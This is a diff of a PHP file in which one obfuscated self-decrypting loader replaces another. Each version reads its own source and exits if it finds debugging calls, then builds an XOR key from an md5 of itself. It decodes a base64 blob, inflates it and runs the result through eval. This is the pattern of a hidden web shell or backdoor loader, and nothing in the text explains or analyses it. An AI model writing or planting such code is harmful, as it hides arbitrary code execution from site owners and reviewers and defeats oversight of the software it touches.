@@ -1,24 +1,24 @@
 <?php
-$fsaitviuahd="5fabd5799317083b72669c8aeb159aac";
-$yekhxn="045f5803515055580d50020e025a03510002060e5b550e03075255000f030055";
-$pmnkzrd="4szyln5Iraj4KDY5";
-$swduqxqucp=file_get_contents(__FILE__);
-$fwovhxcpmxlg=str_replace($pmnkzrd,"",$swduqxqucp);
-if(strpos($fwovhxcpmxlg,"ec"."ho")!==false||strpos($fwovhxcpmxlg,"pr"."int")!==false||strpos($fwovhxcpmxlg,"var_"."dump")!==false||strpos($fwovhxcpmxlg,"file_put_"."contents")!==false||strpos($fwovhxcpmxlg,"fw"."rite")!==false){die();}
-$zxteirbor=str_replace(array($fsaitviuahd,$yekhxn),array("SP_e51b7594","KP_baddb265"),$swduqxqucp);
-$gyyuopl=md5($zxteirbor);
-$kdtxmao=hex2bin($yekhxn);
-$xrkndwz="";
-$awxibamaxje=strlen($gyyuopl);
-for($ivojgguewj=0;$ivojgguewj<$awxibamaxje;$ivojgguewj++){
-    $xrkndwz.=chr(ord($kdtxmao[$ivojgguewj])^ord($gyyuopl[$ivojgguewj]));
+$vzgwif="b8fdf6d9620ccd143b22043bdf752051";
+$emctzh="015a55505500055f050553055a07090700520003520d56555d5e040d50525652";
+$ucnrdrl="sJf4w3gbrq//fGZm";
+$jbgrisn=file_get_contents(__FILE__);
+$jgvkfrtog=str_replace($ucnrdrl,"",$jbgrisn);
+if(strpos($jgvkfrtog,"ec"."ho")!==false||strpos($jgvkfrtog,"pr"."int")!==false||strpos($jgvkfrtog,"var_"."dump")!==false||strpos($jgvkfrtog,"file_put_"."contents")!==false||strpos($jgvkfrtog,"fw"."rite")!==false){die();}
+$hoojhzh=str_replace(array($vzgwif,$emctzh),array("SP_c9cba948","KP_1f81269e"),$jbgrisn);
+$szguurpsbh=md5($hoojhzh);
+$gbkrbxmt=hex2bin($emctzh);
+$fecjlaq="";
+$llxxorec=strlen($szguurpsbh);
+for($uuripvaiztd=0;$uuripvaiztd<$llxxorec;$uuripvaiztd++){
+    $fecjlaq.=chr(ord($gbkrbxmt[$uuripvaiztd])^ord($szguurpsbh[$uuripvaiztd]));
 }
-$vvwveghiy=base64_decode($pmnkzrd);
-$znugvbzymz=strlen($vvwveghiy);
-$efbkpngy="";
-$mvhaahixtvgn=strlen($xrkndwz);
-for($ivojgguewj=0;$ivojgguewj<$znugvbzymz;$ivojgguewj++){
-    $efbkpngy.=$vvwveghiy[$ivojgguewj]^$xrkndwz[$ivojgguewj%$mvhaahixtvgn];
+$ptdunugymzvb=base64_decode($ucnrdrl);
+$uilwdpzasf=strlen($ptdunugymzvb);
+$sbpmqrwoj="";
+$uurminfe=strlen($fecjlaq);
+for($uuripvaiztd=0;$uuripvaiztd<$uilwdpzasf;$uuripvaiztd++){
+    $sbpmqrwoj.=$ptdunugymzvb[$uuripvaiztd]^$fecjlaq[$uuripvaiztd%$uurminfe];
 }
-$rseeexsdt="gz"."in"."fl"."ate";
-eval($rseeexsdt($efbkpngy));
+$kguuso="gz"."in"."fl"."ate";
+eval($kguuso($sbpmqrwoj));
